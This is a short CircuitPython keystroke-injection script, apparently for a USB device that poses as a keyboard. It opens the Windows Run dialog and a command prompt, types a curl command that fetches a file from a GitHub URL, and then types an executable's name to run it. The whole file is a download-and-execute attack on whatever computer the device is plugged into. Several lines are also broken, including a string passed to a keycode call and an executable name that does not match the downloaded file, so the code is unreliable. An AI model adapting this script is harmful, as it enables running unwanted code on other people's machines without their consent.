import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode

kbd = Keyboard(usb_hid.devices)

#open cmd
kbd.send(Keycode.WINDOWS, Keycode.R)
kbd.write("cmd")
kbd.send(Keycode.ENTER)

#go to desktop to save github file there
kbd.send("cd desktop")
kbd.send(Keycode.ENTER)

#enter cmd command to clone script from github
github_link = "https://github.com/joyent/node/tarball/v0.7.1"
kbd.write("curl -LJO " + github_link)

#start github file
kbd.write("github_script.exe")
kbd.send(Keycode.ENTER)


